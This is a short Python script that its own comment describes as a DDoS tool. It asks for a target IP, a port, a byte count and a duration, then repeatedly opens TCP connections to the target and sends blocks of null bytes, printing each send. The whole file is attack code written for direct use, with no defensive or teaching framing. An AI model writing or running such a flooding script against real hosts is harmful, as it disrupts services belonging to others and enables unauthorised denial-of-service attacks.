import socket

try:
    # ddos to ip
    target = input("Enter target ip: ")
    port = int(input("Enter target port: "))
    bytes = int(input("Enter bytes: "))
    duration = int(input("Enter duration: "))
    timeout = duration + 1
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        sock.sendto(bytes * b"\x00", (target, port))
        print(f"Sent {bytes} bytes to {target}:{port}")
        sock.close()
        timeout -= 1
        if timeout == 0:
            break
    print("Done")
except KeyboardInterrupt:
    pass
